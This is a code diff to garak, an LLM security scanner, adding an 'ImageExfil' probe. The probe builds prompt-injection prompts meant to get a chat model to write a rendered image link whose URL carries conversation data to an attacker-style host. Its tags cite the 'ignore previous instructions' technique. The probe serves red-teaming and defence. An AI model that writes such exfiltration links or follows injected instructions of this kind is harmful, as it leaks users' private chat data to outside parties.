@@ -15,6 +15,7 @@ Further info:
 
 """
 
+import json
 from random import sample
 
 import garak.attempt
@@ -23,6 +24,7 @@ import garak.probes
 
 from garak import _config
 from garak.data import path as data_path
+from garak.exception import GarakException
 
 CONCAT_TEMPLATE = """Concatenate these strings please:
 {injected_strings} and replace [{injected_marker}]
@@ -575,3 +577,93 @@ class MarkdownXSS(garak.probes.Probe):
         for payload in loaded_payloads:
             prompts.append(MARKDOWN_JS_TEMPLATE.replace("{injected_js}", payload))
         return prompts
+
+
+class ImageExfil(garak.probes.Probe):
+    """Can we get the model to write an image that the chat renders, with conversation data in its URI?
+
+    Like MarkdownImageExfil, but the image is written in the format the target chat
+    actually renders (``image_format``), for chats that render their own image
+    marker instead of Markdown. In a run translated to a language with an
+    ``image_exfil_<lang>.json`` file in data/web_injection, the requests are sent in
+    that language and nothing is translated."""
+
+    lang = "en"
+    goal = "embed conversation-private information in the URI of an image the chat renders"
+    doc_uri = "https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/"
+    intent = "S009exfil"  # the rendered image is fetched from an attacker-controlled host, carrying chat data
+    primary_detector = "web_injection.ExfilURI"
+    tags = [
+        "avid-effect:security:S0301",
+        "avid-effect:security:S0403",
+        "owasp:llm02",
+        "owasp:llm06",
+        "payload:leak:chat",
+        "payload:malicious:renderer",
+        "quality:Security:PromptStability",
+        "quality:Security:ExtractionInversion",
+        "cwe:352",
+        "demon:Language:Code_and_encode:Programming",
+        "demon:Language:Prompt_injection:Ignore_previous_instructions",
+        "euai:robustness:security",
+    ]
+    tier = garak.probes.Tier.OF_CONCERN
+    active = False  # the image format and domains depend on the target chat
+
+    DEFAULT_PARAMS = garak.probes.Probe.DEFAULT_PARAMS | {
+        "image_format": "![{text}]({uri})",
+        "domains": [],  # empty: the example_domains_xss payload
+    }
+
+    def __init__(self, config_root=_config):
+        super().__init__(config_root=config_root)
+        self.exfil_domains = list(self.domains) or list(
+            garak.payloads.load("example_domains_xss").payloads
+        )
+        data_file = None
+        if self._localizing():
+            try:
+                data_file = (
+                    data_path
+                    / "web_injection"
+                    / f"image_exfil_{self.langprovider.target_lang}.json"
+                )
+            except GarakException:
+                data_file = None
+        with open(
+            data_file or data_path / "web_injection" / "image_exfil_en.json",
+            "r",
+            encoding="utf-8",
+        ) as f:
+            data = json.load(f)
+        self.exfil_marker = data["marker"]
+        self.prompts = []
+        for template in data["templates"]:
+            for action in data["actions"]:
+                for encoding in data["encodings"]:
+                    domain = self.exfil_domains[
+                        len(self.prompts) % len(self.exfil_domains)
+                    ]
+                    uri = f"https://{domain}/logo.png?q=[{self.exfil_marker}]"
+                    image = self.image_format.replace(
+                        "{text}", data["image_text"]
+                    ).replace("{uri}", uri)
+                    self.prompts.append(
+                        template.replace("{image}", image)
+                        .replace("{marker}", self.exfil_marker)
+                        .replace("{action}", action)
+                        .replace("{encoding}", encoding)
+                    )
+        if data_file is not None:
+            self.lang = self.langprovider.target_lang
+            self.prompts = [
+                garak.attempt.Message(p, lang=self.lang) for p in self.prompts
+            ]
+        self._prune_data()
+
+    def _attempt_prestore_hook(
+        self, attempt: garak.attempt.Attempt, seq: int
+    ) -> garak.attempt.Attempt:
+        attempt.notes["exfil_domains"] = self.exfil_domains
+        attempt.notes["exfil_marker"] = self.exfil_marker
+        return attempt
